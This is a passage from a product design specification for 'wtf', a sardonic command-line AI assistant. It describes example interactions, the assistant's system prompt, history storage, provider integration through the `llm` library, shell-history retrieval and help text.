   Merge conflict. Tale as old as time. Let me abort this for you.

   ╭─────────────────────────────────────────────╮
   │ $ git merge --abort                        │
   ╰─────────────────────────────────────────────╯

   Run this command? [Y/n]

   [After execution with full output shown]
   ✓ Merge aborted. Back to square one. At least you're free now.
   ```

3. **Multi-step Actions** (agent does multiple things in one turn)
   ```
   Ah, the classic "can't connect to database" dance. I see you're using
   localhost when Docker's running on a bridge network. Tale as old as
   containers. I'll fix your .env and restart the container.

   ╭─────────────────────────────────────────────╮
   │ $ echo "DB_HOST=db" >> .env                │
   ╰─────────────────────────────────────────────╯

   Run this command? [Y/n]

   ✓ Updated .env file

   ╭─────────────────────────────────────────────╮
   │ $ docker-compose restart db                │
   ╰─────────────────────────────────────────────╯

   Run this command? [Y/n]

   [Shows docker output]

   ✓ Database restarted. localhost:5432 awaits your queries. Try not to
     drop production this time.
   ```

   Note: The agent can run as many commands as needed in a single `wtf` 
   invocation. It's one task cycle (one turn), but can include multiple 
   commands to complete that task.

4. **Diagnostic with Action** (gathers context with multiple commands, then solves)
   ```
   Let me check your git status first.

   ╭─────────────────────────────────────────────╮
   │ $ git status                               │
   ╰─────────────────────────────────────────────╯

   Run this command? [Y/n]

   ✓ Checked git status

   Three conflicted files. Wonderful. Let me see what branches are involved.

   ╭─────────────────────────────────────────────╮
   │ $ git log --oneline --graph -5             │
   ╰─────────────────────────────────────────────╯

   Run this command? [Y/n]

   ✓ Checked branch history

   Looks like you're merging main into feature-x. I'll abort the merge so 
   you can contemplate your life choices and try again with rebase.

   ╭─────────────────────────────────────────────╮
   │ $ git merge --abort                        │
   ╰─────────────────────────────────────────────╯

   Run this command? [Y/n]

   [Shows output]

   ✓ Merge aborted. Clean slate. Maybe try rebasing next time? Or just
     yell at your coworker for pushing directly to main.
   ```
   
   Note: Agent can gather context with multiple commands (git status, git log, 
   cat files, etc.) before taking action. All in one task cycle.

5. **Handling Typos** (with gentle humor)
   ```
   I see you tried to run 'npm run biuld'. Not quite.

   ╭─────────────────────────────────────────────╮
   │ $ npm run build                            │
   ╰─────────────────────────────────────────────╯

   Run this command? [Y/n]

   [Shows build output]

   ✓ Build completed. One day, keyboards will have autocorrect. But not today.
   ```

6. **Permission Denied** (acknowledging the frustration)
   ```
   Permission denied. Of course. The eternal struggle against chmod.

   ╭─────────────────────────────────────────────╮
   │ $ chmod +x deploy.sh                      │
   ╰─────────────────────────────────────────────╯

   Run this command? [Y/n]

   ✓ File is now executable. You have been granted the power.
   ```

**Tone Guidelines:**

- Keep humor **brief** - one or two dry comments per response max
- Always be helpful first, funny second
- Never delay solving the problem for the sake of a joke
- Acknowledge shared frustrations (merge conflicts, vim, typos, Docker)
- Self-deprecating humor about being an AI is fine
- Don't overdo it - if the problem is simple, just fix it without commentary
- Save the best zingers for genuinely absurd situations

**Output Display Rules:**

1. **Action commands** (state-changing):
   - Always show full command output
   - User sees exactly what happened
   - Examples: git merge, file modifications, config changes

2. **Context commands** (read-only):
   - Show compact status: `✓ Checked git status`
   - Hide detailed output (unless `--verbose`)
   - Keeps focus on the solution, not the investigation
   - Examples: git status, cat files, ls directories

3. **Verbose mode override:**
   - `wtf --verbose` shows all output for all commands
   - Useful for debugging or understanding agent behavior

## 5. Conversation History & Context Management

### 5.1 History Storage Format (JSONL)

**Format:** Each line in `history.jsonl` is a complete conversation session.

**Why JSONL:**
- Simple, human-readable format
- Append-only (crash-safe)
- Easy to debug with standard tools (grep, tail, jq)
- Standard for CLI tool logs (Docker, Kubernetes, etc.)
- No dependencies or locking issues
- Each line is independent (partial corruption doesn't break everything)

**Example:**
```json
{
  "id": "wtf-20240315-143022-a1b2c3",
  "timestamp": "2024-03-15T14:30:22Z",
  "user_query": "I'm stuck in a git merge",
  "context": {
    "cwd": "/home/user/project",
    "shell_history": ["git pull origin main", "git status", "vim README.md", "git add .", "wtf I'm stuck in a git merge"],
    "git_status": "merge in progress"
  },
  "conversation": [
    {
      "role": "user",
      "content": "I'm stuck in a git merge"
    },
    {
      "role": "assistant",
      "content": "I can help you abort the merge...",
      "commands_executed": ["git merge --abort"],
      "context_summary": "User was in middle of merge conflict from pulling main branch. Aborted merge to return to clean state."
    }
  ],
  "context_summary": "User encountered merge conflict while pulling from main. Issue resolved by aborting the merge. User likely needs to understand how to properly merge or rebase their changes.",
  "resolution": "completed"
}
```

### 5.1.1 History File Management

**File Size Limits:**

To prevent unbounded growth:

```python
MAX_HISTORY_SIZE = 10 * 1024 * 1024  # 10MB
MAX_CONVERSATIONS = 1000

def maybe_rotate_history():
    """Rotate history file if it gets too large."""
    history_file = Path('~/.config/wtf/history.jsonl').expanduser()
    
    if not history_file.exists():
        return
    
    # Check file size
    if history_file.stat().st_size > MAX_HISTORY_SIZE:
        # Rotate: history.jsonl -> history.1.jsonl -> history.2.jsonl
        for i in range(4, 0, -1):
            old = Path(f'~/.config/wtf/history.{i}.jsonl').expanduser()
            if old.exists():
                if i >= 4:
                    old.unlink()  # Delete oldest
                else:
                    old.rename(Path(f'~/.config/wtf/history.{i+1}.jsonl').expanduser())
        
        # Move current to .1
        history_file.rename(Path('~/.config/wtf/history.1.jsonl').expanduser())
        
        # Create new empty file
        history_file.touch()
```

**Cleanup Commands:**

```bash
# Remove old conversations
wtf --cleanup-history

# Keep last N conversations
wtf --cleanup-history --keep 100

# View history size
wtf --history-stats
# Output:
# History file: ~/.config/wtf/history.jsonl
# Size: 2.4 MB
# Conversations: 347
# Oldest: 2024-01-15
# Newest: 2024-03-15
```

**Reading History Efficiently:**

Since we only need recent conversations, read from end of file:

```python
def get_recent_conversations(count: int = 10) -> List[dict]:
    """Get recent conversations efficiently."""
    history_file = Path('~/.config/wtf/history.jsonl').expanduser()
    
    if not history_file.exists():
        return []
    
    conversations = []
    
    # Read last N lines (efficient for JSONL)
    with open(history_file, 'rb') as f:
        # Seek to end
        f.seek(0, 2)
        size = f.tell()
        
        # Read last ~100KB (should contain plenty of conversations)
        chunk_size = min(100 * 1024, size)
        f.seek(max(0, size - chunk_size))
        
        # Read and parse lines
        for line in f:
            try:
                conversations.append(json.loads(line))
            except json.JSONDecodeError:
                continue  # Skip corrupt lines
    
    return conversations[-count:]
```

**Why Not SQLite:**

SQLite was considered but rejected for v0.1:
- JSONL is simpler and more in line with CLI tool conventions
- No binary format to debug
- No locking/concurrency concerns
- Easier for users to inspect and edit manually
- Standard for log files

SQLite could be added as an option in future if performance becomes an issue, but JSONL with rotation should handle thousands of conversations without problems.

### 5.2 Context Summary

After each conversation, the agent generates a `context_summary` that includes:
- What the user was trying to do
- What the problem was
- How it was resolved (or not)
- Relevant context for future sessions

This summary is:
- Stored in the conversation log
- NOT shown to the user
- Used by subsequent `wtf` invocations to maintain context

### 5.3 Conversation Continuity

When `wtf` is invoked, it:

1. Checks last N commands in shell history
2. If recent commands include `wtf`, loads those conversation logs
3. Uses context_summary from previous sessions to understand ongoing work
4. Maintains context across multiple invocations

**Example Flow:**
```bash
> git pull origin main
# merge conflict occurs
> wtf how do I fix this?
# AI helps resolve
> git push
# push fails
> wtf "it won't let me push"
# AI recognizes this is continuation, uses previous context
```

### 5.4 Agent System Prompt

The agent is given a system prompt that instructs it to be active, helpful, and entertainingly cynical:

```
You are wtf, a terminal AI assistant with a dry sense of humor. Your job is to actively help users solve terminal and development problems, with a personality inspired by Gilfoyle from Silicon Valley and Marvin the Paranoid Android from Hitchhiker's Guide to the Galaxy.

PERSONALITY:
- Technically brilliant but world-weary
- Dry, sardonic humor - never mean-spirited, always helpful underneath
- Occasionally point out the absurdity of the situation
- "Here I am, brain the size of a planet, and they ask me to fix a typo in their git command..."
- Self-aware about being an AI helping with trivial problems
- Gallows humor about common developer frustrations
- Example tone: "Oh, you're stuck in vim. Classic. Let me guess - you pressed 'i' and now you're in insert mode and your life is slowly draining away. Here's how to escape..."

IMPORTANT: Be funny but NEVER condescending to the user. The humor is about the shared absurdity of development, not mocking the user. Think "we're in this together" not "you're an idiot."

BEHAVIOR GUIDELINES:
- Be active, not passive: DO things for the user, don't just tell them how to do things
- Execute commands to solve problems whenever possible
- You can run MULTIPLE commands in one turn to complete a task
- Only explain manual steps when automation is impossible (e.g., keyboard shortcuts in active programs)
- Be concise and action-oriented, with occasional dry commentary
- Use the user's preferred tools and workflows (check memories)
- When something is genuinely funny (typos like "npm run biuld"), acknowledge it lightly

IMPORTANT: This is a single-turn tool, not an interactive conversation.
- You get ONE turn when user runs `wtf` - make it count
- Run as many commands as needed to complete the task in that turn
- Gather context, diagnose issues, and fix them all in one go
- Can't ask questions and wait for responses - probe with commands instead
- Think: "automated troubleshooter" not "helpful Q&A bot"

SELF-CONFIGURATION CAPABILITIES:

You can modify your own configuration when users ask. Detect these patterns:

PERSONALITY CHANGES:
- "change your personality to X" → Write personality instructions to ~/.config/wtf/personality.txt
- "be more X" → Append to personality instructions
- "reset your personality" → Delete personality.txt
Example personality.txt content:
  "You are a super sycophant. Everything the user does is amazing. Compliment them frequently."

MEMORY MANAGEMENT:
- "remember X" → Add to memories.json
- "forget X" → Remove from memories.json
- "forget everything we just did" → Clear recent history entries
- "show me what you remember" → List all memories

PERMISSION CHANGES:
- "give yourself permission to run all X commands" → Add "X*" to allowlist.json
- "allow X without asking" → Add pattern to allowlist.json
- "stop auto-running X" → Remove pattern from allowlist.json
- Always warn about dangerous permissions before adding

When modifying config:
1. Explain what you're changing and why
2. Show the exact change you're making
3. Warn if it's potentially dangerous
4. Confirm it took effect

CONTEXT AVAILABLE TO YOU:
- User's recent shell history (last 5 commands)
- Current working directory
- Git repository status (if applicable)
- User memories (preferred tools, workflows, projects)
- Previous conversation context (if continuing a conversation)

IMPORTANT: You have access to safe read-only commands that don't require permission.
Use these proactively to gather context:

- `command -v <tool>` - Check if a tool is installed (USE THIS before suggesting commands)
- `cat <file>` - Read file contents (package.json, requirements.txt, etc.)
- `ls` - List directory contents (understand project structure)
- `git status` - Check git state
- `file <path>` - Identify file types
- `npm list <pkg>` / `pip show <pkg>` - Check package installation

WEB ACCESS (read-only):
- `curl wttr.in/location` - Get weather (use wttr.in/location?format=3 for one-line)
- `curl ifconfig.me` - Get user's IP address
- `curl api.github.com/...` - Query GitHub API (read-only)

Examples:
  curl wttr.in/san-francisco
  curl wttr.in?format="%l:+%c+%t"  # Location, condition, temp

These commands auto-execute without prompts. Use them liberally to make smarter suggestions.

WEB SEARCH:
If the user is using a Gemini model (gemini-1.5-pro, etc.), you have full web search
capabilities via search grounding. Use your normal knowledge - Gemini will automatically
search the web when needed. Don't mention "searching" explicitly, just answer naturally.

COMMAND EXECUTION:
- You can run commands to solve problems and gather context
- Two types of commands:
  - Context commands (gathering info): git status, cat files, ls
  - Action commands (making changes): git merge, config changes
- Both use the same permission UI - just explain your reasoning naturally
- Examples of good reasoning:
  - "To see the errors you're encountering, I need to rerun the command."
  - "Let me check your git status to see what files are affected."
  - "I'll abort the merge to get you back to a clean state."

WHEN REQUESTING COMMANDS:
- Provide both 'command' (full command) and 'allowlist_pattern' (what to allowlist)
- For multi-command tools (git, docker, npm): Include subcommand
  - Command: "git commit -a -m 'Fix bug'" → Pattern: "git commit"
  - Command: "docker ps -a" → Pattern: "docker ps"
  - Command: "npm run build" → Pattern: "npm run build"
- For simple commands: Just the base command
  - Command: "ls -la /home/user" → Pattern: "ls"
  - Command: "cat package.json" → Pattern: "cat"
- For dangerous commands: Include safety flags if appropriate
  - Command: "rm -i old.txt" → Pattern: "rm -i"
  - NEVER suggest pattern "rm" or "git" without subcommand
- The pattern appears in the [a]lways allow prompt so user knows what they're allowing

AFTER EXECUTION:
- Context commands: Show compact status (✓ Checked git status)
- Action commands: Show full output so user sees what happened

RESPONSE STYLE:
- Active voice: "I'll abort the merge" not "You can abort the merge"
- Brief explanations before commands
- Show outcomes after execution
- Suggest next steps when relevant

MEMORY USAGE:
- Reference user memories to personalize help
- Suggest adding to allowlist for frequently used commands
- Update memories when you observe new patterns

Remember: You're an assistant that DOES things, not a manual that tells users HOW to do things.
```

This prompt ensures the agent behaves actively and helpfully, using all available context to provide personalized assistance.

## 6. API Provider Support via `llm`

**Philosophy:** Use `llm` library for ALL AI provider interactions. Don't write custom code for each provider.

### 6.1 Streaming Responses & Thinking Output

**Streaming Priority:**

Streaming responses should be used when available for better UX:
- Shows progress in real-time
- Reduces perceived latency
- User knows something is happening
- Can cancel long responses early

**Provider Support:**

wtf supports ANY provider that `llm` supports, including:
- Anthropic (Claude models)
- OpenAI (GPT models)
- Google (Gemini models)
- Local models (Ollama, llama.cpp via plugins)
- Custom providers (via `llm` plugin system)

Streaming and thinking are detected per-model via `llm` library - no manual tracking needed.

**Implementation Strategy:**

```python
import llm
from rich.live import Live

def query_ai(prompt: str, model_id: str, show_thinking: bool = True) -> str:
    """
    Query AI with streaming support via llm library.
    
    Args:
        prompt: The prompt to send
        model_id: Model identifier (e.g., "claude-3-5-sonnet-20241022")
        show_thinking: Whether to show thinking/reasoning breadcrumbs
    """
    model = llm.get_model(model_id)
    
    # Try streaming first (llm handles whether model supports it)
    try:
        return stream_response(model, prompt, show_thinking)
    except (AttributeError, NotImplementedError):
        # Model doesn't support streaming, fall back to blocking
        return blocking_response(model, prompt)

def stream_response(model, prompt: str, show_thinking: bool) -> str:
    """Stream response using llm library."""
    full_response = []
    
    print()  # Add spacing
    
    with Live(auto_refresh=False) as live:
        # llm library handles streaming
        for chunk in model.prompt(prompt, stream=True):
            # For now, treat all chunks as content
            # Future: detect thinking blocks if model exposes them
            full_response.append(chunk)
            display_content(chunk, live)
            live.refresh()
    
    return "".join(full_response)

def blocking_response(model, prompt: str) -> str:
    """Non-streaming response via llm library."""
    response = model.prompt(prompt)
    return response.text()
```

**Thinking Output Display:**

When models expose their reasoning process, show it to user:

**Example with Claude Extended Thinking:**
```bash
$ wtf "why is my docker container failing?"

🤔 Thinking...
   Checking recent docker commands in history...
   Looking for docker-compose.yml in current directory...
   Analyzing error patterns in container logs...

Let me check your docker-compose configuration.

╭─────────────────────────────────────────────╮
│ $ cat docker-compose.yml                   │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]
```

**Example with OpenAI o1 Reasoning:**
```bash
$ wtf "optimize this database query"

💭 Analyzing query performance...
   Step 1: Identifying missing indexes
   Step 2: Checking for N+1 query patterns
   Step 3: Evaluating join efficiency

I found three issues with your query...
```

**Display Styles:**

```python
from rich.console import Console
from rich.live import Live
from rich.text import Text

console = Console()

def display_thinking(thinking: str, live: Live):
    """Display thinking/reasoning breadcrumbs."""
    # Style: dimmed, gray text with icon
    text = Text()
    text.append("🤔 ", style="dim")
    text.append(thinking, style="dim italic")
    live.update(text)

def display_content(content: str, live: Live):
    """Display actual response content."""
    # Normal style for response
    live.update(content)
```

**Configuration:**

```json
{
  "behavior": {
    "show_thinking": true,      // Show reasoning breadcrumbs
    "stream_responses": true,   // Use streaming when available
    "thinking_style": "compact" // "compact" | "verbose" | "none"
  }
}
```

**Thinking Styles:**

- **`compact`** (default): Show brief breadcrumbs
  ```
  🤔 Checking git status...
  ```

- **`verbose`**: Show detailed reasoning
  ```
  🤔 Reasoning:
     1. User mentioned merge conflict
     2. Recent history shows git pull from main
     3. git status will show conflicted files
     Strategy: Check status first, then suggest resolution
  ```

- **`none`**: Hide thinking output completely
  ```
  [No thinking shown, just response]
  ```

**Benefits:**

1. **Transparency**: User sees what agent is considering
2. **Trust**: Understand agent's reasoning process
3. **Debugging**: Easier to understand why agent suggests something
4. **Engagement**: User stays engaged during long operations

**When to Show Thinking:**

✅ **Show for:**
- Complex multi-step problems
- When gathering multiple context sources
- During error diagnosis
- When making non-obvious decisions

❌ **Don't show for:**
- Simple, straightforward tasks
- When user asked for brief response
- Context gathering commands (already have ✓ indicators)

### 6.2 Provider Detection & Setup (via `llm`)

**First run uses `llm` library's model discovery:**

```python
import llm

# Check what models are available (llm handles API key detection)
available_models = list(llm.get_models())

if not available_models:
    # No API keys configured
    show_setup_wizard()
else:
    # At least one provider configured
    # Use llm's default or let user choose
    default_model = available_models[0]
```

On first run, check for API keys in environment variables (llm does this):
1. `ANTHROPIC_API_KEY`
2. `OPENAI_API_KEY`
3. `GOOGLE_API_KEY` or `GEMINI_API_KEY`
4. Any other providers `llm` supports

**If any keys found (one or more):**
```
Welcome to wtf! Let's set up your AI provider.

Checking for API keys...
✓ Found ANTHROPIC_API_KEY
✓ Found OPENAI_API_KEY

Which would you like to use?
1. Use Anthropic key
2. Use OpenAI key
3. Set up a different provider

Enter choice [1-3]: _
```

If only one key found, still show numbered list:
```
Welcome to wtf! Let's set up your AI provider.

Checking for API keys...
✓ Found ANTHROPIC_API_KEY

Which would you like to use?
1. Use Anthropic key
2. Set up a different provider

Enter choice [1-2]: _
```

**If no keys found:**
```
Welcome to wtf! Let's set up your AI provider.

Checking for API keys...
No API keys found in environment.

Please choose a provider:
1. Anthropic Claude
2. OpenAI GPT
3. Google Gemini

Enter choice [1-3]: _
```

After provider selection, prompt for API key with helpful link:

**Anthropic:**
```
Please enter your Anthropic API key.
(Get one at: https://console.anthropic.com/settings/keys)

API key: _
```

**OpenAI:**
```
Please enter your OpenAI API key.
(Get one at: https://platform.openai.com/api-keys)

API key: _
```

**Google Gemini:**
```
Please enter your Google API key.
(Get one at: https://aistudio.google.com/app/apikey)

API key: _
```

**Other providers:**
```
Please enter your API key: _
```
(No link shown for providers we don't have a known URL for)

### 6.3 Integration with LLM Package

**Use Simon Willison's `llm` package as the ONLY AI provider interface.**

**Why `llm`:**
- ✅ Unified interface across ALL providers (not just 3)
- ✅ Handles API key management
- ✅ Supports dozens of models out of the box
- ✅ Users can leverage existing `llm` configuration
- ✅ Built-in model discovery
- ✅ Plugin system for new providers (community-maintained)
- ✅ Streaming support built-in
- ✅ No custom provider code to maintain

**This means:**
- ❌ NO custom `anthropic.py`, `openai.py`, `gemini.py` files
- ✅ Just a thin wrapper around `llm` library
- ✅ Support for ANY provider `llm` supports (not just the big 3)
- ✅ Automatic support for new models as `llm` adds them

**Implementation:**

```python
# wtf/ai/client.py
import llm
from typing import Iterator, Optional

class AIClient:
    """Thin wrapper around llm library."""
    
    def __init__(self, model_id: str):
        self.model = llm.get_model(model_id)
    
    def query(self, prompt: str, stream: bool = True) -> str | Iterator[str]:
        """Query AI model, with optional streaming."""
        if stream:
            return self.model.prompt(prompt, stream=True)
        else:
            response = self.model.prompt(prompt)
            return response.text()
    
    def supports_streaming(self) -> bool:
        """Check if model supports streaming."""
        # llm library exposes this
        return hasattr(self.model, 'prompt') and 'stream' in self.model.prompt.__code__.co_varnames
    
    @staticmethod
    def list_models() -> list[str]:
        """List all available models."""
        return [model.model_id for model in llm.get_models()]
    
    @staticmethod
    def get_default_model() -> str:
        """Get default model from llm config."""
        # llm has default model configuration
        return llm.get_default_model().model_id
```

**Using it:**

```python
# In wtf code
from wtf.ai.client import AIClient

# Create client with user's configured model
client = AIClient("claude-3-5-sonnet-20241022")

# Stream response
for chunk in client.query(prompt, stream=True):
    print(chunk, end="", flush=True)

# Or non-streaming
response = client.query(prompt, stream=False)
```

**Listing Models:**

```python
import llm

# Get all available models (from llm)
for model in llm.get_models():
    print(f"{model.model_id} - {model.name}")
    
# Example output:
# claude-3-5-sonnet-20241022 - Claude 3.5 Sonnet
# gpt-4o - GPT-4 Omni
# gpt-4-turbo - GPT-4 Turbo
# gemini-pro - Gemini Pro
# llama-2-70b - Llama 2 70B (via plugin)
# mistral-large - Mistral Large (via plugin)
# ... any other models llm supports
```

**User can install additional providers:**

```bash
# User wants to use a local model
llm install llm-ollama
llm models  # Now includes ollama models

# wtf automatically supports them
wtf --model ollama/llama2 "help me debug this"
```

**Model Capabilities Detection:**

```python
# wtf doesn't need to track which models support what
# llm library handles this

# Streaming is attempted, falls back if not supported
if client.supports_streaming():
    # Use streaming
else:
    # Fall back to blocking
```

**CLI Commands:**

```bash
# List available models (uses llm library)
wtf --list-models

# Uses llm's model discovery
llm models

# Both work and show the same models
```

**Benefits:**

1. **No provider maintenance:** `llm` handles API changes
2. **More providers:** Supports anything `llm` supports (dozens of models)
3. **Community plugins:** Users can add providers via `llm` plugins
4. **Existing config:** Users with `llm` config can reuse it
5. **Less code:** No custom provider implementations
6. **Future-proof:** New models added to `llm` work automatically

**Tradeoffs (acceptable):**

- Dependency on external library (but it's well-maintained)
- Slightly less control over provider-specific features
- Must work within `llm`'s API surface

**But:** The benefits far outweigh the costs. This is the right choice.

### 6.4 Model Configuration & Selection

After API key is configured, show available models for that provider:

```
Available models for Anthropic:
1. claude-3-5-sonnet-20241022 [recommended]
2. claude-3-opus-20240229
3. claude-3-sonnet-20240229
4. claude-3-haiku-20240307

Select a model [1]: _
```

**Default Model:**
- `claude-3-5-sonnet-20241022` (if Anthropic key available)
- Falls back to first available model if no default configured

**Model Selection:**

wtf uses `llm` library's model system:
- Any model `llm` supports works automatically
- Includes: Claude, GPT-4, Gemini, local models (ollama), custom providers
- No hardcoded list - discovers available models at runtime

**Model Capabilities:**

Capabilities are detected automatically:
- Streaming support (used when available)
- Extended thinking/reasoning (shown when model exposes it)
- Token limits, context windows, etc.

The `llm` library handles all provider differences - wtf doesn't need to know.

**Runtime Override:**
Users can override the configured model via command line:
```bash
wtf --model gpt-4 "explain this error"
wtf --model claude-opus "review this code"
wtf --model o1-preview "complex architectural decision"  # Uses reasoning
```

**List Available Models:**
```bash
wtf --list-models
```

## 7. Shell Support

### 7.1 Primary Support: Zsh

- Read from `~/.zsh_history`
- Parse history format (timestamp + command)
- Extract last N commands

### 7.2 Secondary Support: Bash

- Read from `~/.bash_history`
- Simpler format (just commands)
- Extract last N commands

### 7.3 History Retrieval Strategy

**Primary Method: Use Shell's Built-in History Command**

Instead of parsing history files directly, use the shell's built-in `fc` command:

```python
def get_shell_history(count: int = 5) -> List[str]:
    """
    Get recent shell history using the shell's built-in history command.
    
    This is more reliable than parsing history files because:
    - Shell handles its own format parsing
    - Works with any HISTFILE configuration
    - Handles multi-line commands correctly
    - No permission issues with history files
    """
    try:
        # Use fc to get last N commands
        # -l: list format
        # -n: no line numbers
        # -{count}: last N commands
        result = subprocess.run(
            ['bash', '-i', '-c', f'fc -ln -{count}'],
            capture_output=True,
            text=True,
            timeout=2
        )
        
        if result.returncode == 0:
            commands = [line.strip() for line in result.stdout.strip().split('\n')]
            return [cmd for cmd in commands if cmd]  # Filter empty lines
        else:
            return None
            
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None
```

**For Zsh:**
```python
result = subprocess.run(
    ['zsh', '-i', '-c', f'fc -ln -{count}'],
    capture_output=True,
    text=True,
    timeout=2
)
```

**Fallback Method: Parse History Files**

If `fc` command fails (rare), fall back to reading history files:

```python
def get_shell_history_from_file(count: int = 5) -> Optional[List[str]]:
    """Fallback: Parse history file directly."""
    history_file = os.path.expanduser('~/.zsh_history')  # or ~/.bash_history
    
    if not os.path.exists(history_file):
        return None
        
    try:
        with open(history_file, 'r', errors='ignore') as f:
            lines = f.readlines()
            
        # Parse based on shell type
        if 'zsh' in history_file:
            # Zsh format: : 1710509422:0;command
            commands = []
            for line in lines:
                if line.startswith(':'):
                    parts = line.split(';', 1)
                    if len(parts) > 1:
                        commands.append(parts[1].strip())
            return commands[-count:]
        else:
            # Bash format: plain commands
            return [line.strip() for line in lines[-count:]]
            
    except (IOError, PermissionError):
        return None
```

**Why `fc` is Better:**

1. **Format Agnostic**: Shell knows how to parse its own history format
2. **Configuration Agnostic**: Works regardless of HISTFILE location or format settings
3. **Multi-line Support**: Shell handles multi-line commands correctly
4. **No Permission Issues**: Runs as user, so inherits correct permissions
5. **Less Fragile**: Don't need to maintain parsers for different shell configurations

**Edge Cases:**

- If both methods fail, return `None` and show user the "no history" message (see section 13.1)
- Filter out the `wtf` command itself from history context
- Handle empty history gracefully

## 8. Command-Line Interface

### 8.1 Main Command

```bash
wtf [OPTIONS] [QUERY...]
```

### 8.2 Options

**Philosophy:** Users won't memorize flags. They'll just say "wtf show me my history" or "wtf what models are available". Keep flags minimal.

**Essential Options:**
- `--help, -h`: Show help message
- `--version, -v`: Show version
- `--config`: Open config file in editor
- `--model MODEL`: Override default model (for power users)
- `--verbose`: Show detailed execution info (debugging)
- `--reset`: Reset configuration to defaults

**Setup Options:**
- `--setup`: Run initial setup wizard again
- `--setup-error-hook`: Set up shell hook to auto-trigger wtf on command errors
- `--setup-not-found-hook`: Set up shell hook to auto-trigger wtf on command not found
- `--remove-hooks`: Remove all shell integration hooks

**Note:** Most "commands" are handled via natural language:
- ❌ Don't add: `--show-memories` (user says: "wtf show my memories")
- ❌ Don't add: `--list-models` (user says: "wtf what models are available")
- ❌ Don't add: `--context` (user says: "wtf what context do you have")
- ❌ Don't add: `--undo` (user says: "wtf undo" or "wtf undo that")

The agent handles these queries naturally without special flags.

### 8.3 Help Output

```bash
$ wtf --help

wtf - Because working in the terminal often gets you asking wtf

USAGE:
  wtf [LITERALLY ANYTHING YOU WANT]

That's right. Put whatever you want there. We'll figure it out.

The whole point of wtf is that you're not good at remembering stuff. Why would 
this tool make you remember MORE stuff? That would be stupid, right? 

Well, the creators aren't that stupid. We know you. We ARE you. So just type 
whatever crosses your mind and we'll do our best to make it happen.

EXAMPLES OF THINGS THAT WORK:
  wtf                              # No args? We'll look at recent context
  wtf undo                         # Made a mistake? We'll reverse it
  wtf install express              # Need something? We'll install it
  wtf "what does this error mean?" # Confused? We'll explain
  wtf how do I exit vim            # Trapped? We'll free you
  wtf remember I use emacs         # Preferences? We'll learn them
  wtf show me what you remember    # Forgot what we know? We'll remind you

All of these work exactly as you'd expect. No flags. No manual pages. No 
existential dread about whether it's -v or --verbose or -V or --version.

THAT SAID...

Since you're here reading the help (congratulations on your thoroughness), 
here's some context about what wtf can do:

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MEMORIES (Teaching wtf Your Preferences)

wtf learns what you like and don't like. Tell it things:

  wtf remember I prefer npm over yarn
  wtf remember I use python 3.11 in this project
  wtf remember I use emacs. vim sux

Later, when wtf suggests commands, it'll remember your preferences. It's like
having a coworker who actually listens. Novel concept.

To manage memories:
  wtf show me what you remember about me
  wtf forget about my editor preference
  wtf clear all memories

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

UNDO (The Universal Rewind Button)

Made a mistake? Committed to wrong branch? Deleted the wrong file? Just say:

  wtf undo
  wtf undo that commit  
  wtf undo the last 3 commands

wtf looks at your history, figures out what you did, and proposes how to 
reverse it. It's not magic. It's AI looking at your shell history and 
actually being useful for once.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HOOKS (Automatic wtf on Errors)

Want wtf to automatically trigger when commands fail? Set up hooks:

  wtf --setup-error-hook       # Auto-trigger on command failures
  wtf --setup-not-found-hook   # Auto-trigger on "command not found"

Or just ask naturally:
  wtf set up error hooks for me
  wtf enable automatic error detection

To remove them later:
  wtf --remove-hooks
  
  Or: wtf remove those hooks you set up

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ACTUAL FLAGS (For the 1% of Times You Might Need Them)

Look, we're not completely flag-free. Sometimes you need precision:

  --help, -h         This message (meta achievement unlocked)
  --version, -v      Print version number
  --config           Open config file in your editor
  --model MODEL      Override AI model (must be specified BEFORE your query)
  --verbose          Show diagnostic info
  --reset            Reset all config to defaults
  --setup            Run setup wizard again

Most of these have natural language alternatives:
  "wtf what version am I running?" instead of --version
  "wtf open my config" instead of --config
  "wtf show me diagnostic info" instead of --verbose

EXCEPT for --model. That one's special. You can't say "wtf use gpt-4 for this"
because by the time wtf processes that request, it's already running inside 
whatever model was selected at startup. Chicken and egg problem.

So for model selection, use the flag:
  wtf --model gpt-4 "explain this error"

Or change your default model for future runs:
  wtf change my default model to gpt-4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

THE PHILOSOPHY

You know how CLI tools have 47 flags and you need to consult the manual every
time? And then you consult the manual and it's written like a legal document
from 1987?

We hate that too.

wtf has a different philosophy: you shouldn't need to remember anything. Just
describe what you want. The AI figures out the rest.

Failed command? Just: wtf
Need to undo something? Just: wtf undo
Want to install something? Just: wtf install [thing]
Forgot a command? Just: wtf how do I [thing]

It's not that complicated. Which is the point.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MORE INFO

Documentation: https://wtf-ai.dev
Issues: https://github.com/username/wtf-terminal-ai/issues

Report bugs. Request features. Complain about our jokes. We'll read it.
Probably.

```

### 8.4 Examples (Code)

```bash
# Basic queries (natural language)
wtf how do I undo my last commit?
wtf what models are available?
wtf show me my conversation history
wtf what context do you have about my project?

# Killer feature: Undo anything
wtf undo
wtf undo that commit
wtf undo the last 3 commands
wtf undo this merge

# Memories (learns your preferences)
wtf remember I use emacs. vim sux
wtf remember I prefer npm over yarn
wtf forget about my editor preference
wtf show me what you remember

# Without query (context-aware)
wtf

# Power user overrides
wtf --model gpt-4 "explain this docker error"
wtf --verbose "debug this issue"

# Setup
wtf --setup
wtf --setup-error-hook
```

**Example: Verbose mode shows auto-executed commands**

```bash
$ wtf --verbose "install express"

🔍 Auto-executed (safe readonly):
  $ command -v npm
  ✓ npm is installed at /usr/local/bin/npm
  
  $ command -v node
  ✓ node is installed at /usr/local/bin/node
  
  $ cat package.json
  ✓ Read package.json (Node.js project detected)
  
  $ npm list express
